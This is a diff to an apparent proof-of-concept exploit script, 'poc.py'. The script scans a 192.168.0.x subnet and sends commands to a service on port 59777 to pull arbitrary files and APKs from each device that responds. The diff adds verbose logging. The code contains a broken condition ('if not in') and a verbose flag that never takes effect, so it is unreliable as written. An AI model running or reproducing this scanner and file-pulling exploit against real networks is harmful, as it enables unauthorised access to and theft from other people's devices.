@@ -6,6 +6,7 @@ import sys
 from socket import *
 
 network = '192.168.0.'
+verbose = True
 
 
 def sanitize_json(json):
@@ -16,6 +17,8 @@ def sanitize_json(json):
 
 
 def get_file(addr, filepath):
+    if verbose:
+        print('[*] Getting file: ' + filepath + '\n\tfrom: ' + addr)
     session = requests.Session()
 
     headers = {"Content-Type": "application/json"}
@@ -23,14 +26,20 @@ def get_file(addr, filepath):
     filename = filepath.rsplit('/', 1)[1]
 
     resp = session.get(address, headers=headers, verify=False)
+    if verbose:
+        print('[*] Server responded with: ' + str(resp.status_code))
     if resp and resp.status_code == 200:
+        if verbose:
+            print('[*] Writing to file: ' + filename)
         with open(filename, 'wb') as f:
             f.write(resp.content)
 
 
 def execute_cmd(addr, cmd, package):
-    session = requests.Session()
+    if verbose:
+        print('[*] Executing command: ' + cmd + ' on ' + addr)
 
+    session = requests.Session()
     headers = {"Content-Type": "application/json"}
     address = 'http://' + addr + ':59777'
 
@@ -40,7 +49,13 @@ def execute_cmd(addr, cmd, package):
         data = '{ "command":' + cmd + ' }'
 
     resp = session.post(address, headers=headers, data=data, verify=False)
-
+    
+    if verbose:
+        print('[*] Server responded with: ' + str(resp.status_code))
+    if "NameNotFoundException" in resp.text:
+        print('[!] Package \'' + package + '\' not found!')
+        return
+      
     if not in ('getDeviceInfo', 'appLaunch', 'listAppsSdcard', 'listVideos', 'listFiles'):
         text = sanitize_json(resp.text)
     else:
@@ -48,9 +63,13 @@ def execute_cmd(addr, cmd, package):
 
     if resp and resp.status_code == 200:
         if cmd == 'getAppThumbnail':
+            if verbose:
+                print('[*] Getting app thumbnail: ' + package)
             with open(package + ".jpg", 'wb') as f:
                 f.write(resp.content)
         elif cmd == 'appPull':
+            if verbose:
+                print('[*] Pulling app: ' + package)
             with open(package + ".apk", 'wb') as f:
                 f.write(resp.content)
         else:
@@ -101,19 +120,29 @@ def set_up_menu():
     parser.add_option('-p', '--pkg',
                       action="store", dest="package",
                       help="Package name", default="")
+    parser.add_option('-v', '--verbose',
+                      action="store_true", dest="verb",
+                      help="Loud stdout")
 
     return parser.parse_args()
 
 
 def main():
     options, _ = set_up_menu()
+    verbose = options.verb
 
     if len(sys.argv) > 1 and sys.argv[1] == 'list':
         show_available_cmds()
     elif options.filepath != '' or options.cmd != '':
         for ip in range(0, 255):
             addr = network + str(ip)
+            if verbose:
+                print('[*] Checking address: ' + addr)
+
             if is_up(addr):
+                if verbose:
+                    print('[+] Address is up: ' + addr)
+
                 if options.filepath != '':
                     get_file(addr, options.filepath)
                 elif options.cmd != '':
@@ -124,6 +153,7 @@ def main():
         print('- python3 poc.py --get-file [filepath]')
         print('- python3 poc.py --cmd [cmd]')
         print('- python3 poc.py --cmd [cmd] --pkg [package_name]')
+        print('- python3 poc.py --verbose --cmd [cmd] --pkg [package_name]')
 
 
 if __name__ == '__main__':
